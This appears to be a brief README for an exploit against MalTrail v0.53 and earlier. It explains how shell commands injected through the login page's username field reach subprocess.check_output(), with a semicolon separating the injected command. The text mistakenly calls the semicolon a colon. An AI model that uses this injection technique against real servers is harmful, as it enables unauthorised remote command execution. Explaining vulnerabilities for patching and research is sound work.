# Exploit MalTrail <= v0.53

the "username" parameter on the login page lacks proper access control, granting an attacker the ability to input operating system commands.

The service utilizes the subprocess.check_output() function to run a shell command that takes in the username provided by the user. If the attacker provides a specially crafted username, they can inject arbitrary shell commands to be executed on the server.

In shell scripts, the colon ; is utilized to delimit multiple commands. Consequently, when the attacker supplies a username containing a colon followed by a shell command, the shell interprets everything after the colon as a distinct command.
